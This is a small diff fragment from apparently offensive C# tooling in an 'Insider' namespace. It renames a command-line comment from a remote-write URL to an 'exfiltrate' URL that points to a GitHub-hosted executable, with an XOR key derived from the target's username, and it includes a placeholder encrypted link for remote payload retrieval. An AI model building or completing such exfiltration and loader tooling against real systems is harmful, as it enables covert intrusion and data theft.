@@ -542,7 +542,7 @@ namespace Insider
 
 				Worker remoteWorker2 = (Worker)step2.CreateInstanceAndUnwrap(typeof(Worker).Assembly.FullName, new Worker().GetType().FullName);
 
-				// cmd: .\encrypt.exe /remotewriteurl:https://github.com/[remotewrite.exe] /xor_key:[usernameoftarget] /out:xor_b64
+				// cmd: .\encrypt.exe /exfiltrateurl:https://github.com/[exfiltrate.exe] /xor_key:[usernameoftarget] /out:xor_b64
 				string encryptedlink2 = "awdwdawdawdawd";	// change it
 
 				Console.WriteLine("[+] RemoteWrite URL Decryption Started... ");
